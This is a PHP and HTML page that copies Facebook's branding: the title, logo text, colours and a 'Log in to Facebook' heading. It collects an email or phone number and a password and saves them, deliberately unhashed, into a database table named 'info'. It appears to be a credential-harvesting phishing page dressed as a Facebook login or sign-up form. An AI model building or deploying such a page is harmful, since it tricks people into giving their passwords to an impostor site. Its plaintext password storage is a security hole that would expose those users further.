<?php
session_start();
include_once 'connection.php';

// Check DB connection
if (!$con) {
    die("Connection failed: " . mysqli_connect_error());
}

// Sanitize input
function sanitize_input($data) {
    return htmlspecialchars(trim($data), ENT_QUOTES, 'UTF-8');
}

$message = '';

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $email_or_phone = sanitize_input($_POST['email_or_phone'] ?? '');
    $password = sanitize_input($_POST['password'] ?? '');

    if (empty($email_or_phone) || empty($password)) {
        $message = "Please fill in all fields.";
    } else {
        // Check if it's an email or phone number
        $is_email = filter_var($email_or_phone, FILTER_VALIDATE_EMAIL);
        $field = $is_email ? 'email' : 'phone_number';

        // Check if user already exists
        $check_sql = "SELECT id FROM info WHERE $field = ?";
        $stmt = $con->prepare($check_sql);
        $stmt->bind_param("s", $email_or_phone);
        $stmt->execute();
        $stmt->store_result();

        if ($stmt->num_rows > 0) {
            $message = "An account with this " . ($is_email ? "email" : "phone number") . " already exists.";
        } else {
            // Insert new user without hashing password
            $insert_sql = "INSERT INTO info ($field, password) VALUES (?, ?)";
            $stmt = $con->prepare($insert_sql);
            $stmt->bind_param("ss", $email_or_phone, $password);

            if ($stmt->execute()) {
                $message = "Registration successful! You can now <a href='login.php'>log in</a>.";
            } else {
                $message = "Registration failed: " . $stmt->error;
            }
        }

        $stmt->close();
    }
}

$con->close();
?>



<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Login into Facebook</title>
  <link rel="icon" href="fb.png"/>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #f0f2f5;
      display: flex;
      flex-direction: column;
      min-height: 100vh;
    }

    .register-box {
      background: white;
      padding: 30px;
      border-radius: 8px;
      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
      text-align: center;
      width: 100%;
      max-width: 400px;
    }

    .logo {
      font-size: 36px;
      color: #1877f2;
      font-weight: bold;
      margin-bottom: 20px;
    }

    .form-control {
      margin-bottom: 15px;
      border-radius: 6px;
    }

    .btn-primary {
      background-color: #1877f2;
      border: none;
      border-radius: 6px;
    }

    .message {
      color: red;
      font-size: 14px;
      margin-bottom: 15px;
    }
  </style>
</head>
<body>

<div class="container d-flex justify-content-center align-items-center flex-grow-1 py-5">
  <div class="register-box">
    <div class="logo">facebook</div>
    <h2 class="fs-5 mb-3">Log in to Facebook</h2>

    <?php if (!empty($message)): ?>
      <div class="alert alert-info"><?= $message ?></div>
    <?php endif; ?>

    <!-- Registration Form -->
    <form method="POST" action="">
      <input type="text" name="email_or_phone" class="form-control" placeholder="Email or Phone number" required>
      <input type="password" name="password" class="form-control" placeholder="New Password" required>
      <button type="submit" class="btn btn-primary w-100">Sign Up</button>
    </form>

    <div class="mt-3">
      Already have an account? <a href="login.php">Log In</a>
    </div>
  </div>
</div>

</body>
</html>
